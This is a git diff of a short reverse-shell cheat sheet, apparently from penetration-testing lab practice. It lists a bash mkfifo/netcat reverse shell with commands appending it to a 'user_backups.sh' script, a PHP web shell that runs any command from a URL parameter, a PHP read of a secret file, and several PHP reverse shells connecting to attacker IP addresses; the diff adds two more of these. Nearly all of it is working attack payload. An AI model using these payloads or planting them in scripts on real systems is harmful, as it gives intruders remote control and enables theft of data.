@@ -1,7 +1,7 @@
 #!/usr/bin/peno
 #reverse-shells
 
-#BASH
+#BASH Reverse Shells
 #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
 echo >> user_backups.sh 
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
@@ -9,7 +9,9 @@ cat user_backups.sh
 
 
 
-#PHP
+#PHP Reverse Shells
 <?php system($_GET['cmd']);?>
 <?php echo file_get_contents('/home/carlos/secret'); ?>                                                         
 <?php system("bash -i >& /dev/tcp/10.11.0.99/443 0>&1"); ?>
+<?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>
+<?php $sock = fsockopen("10.11.0.99",5566); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
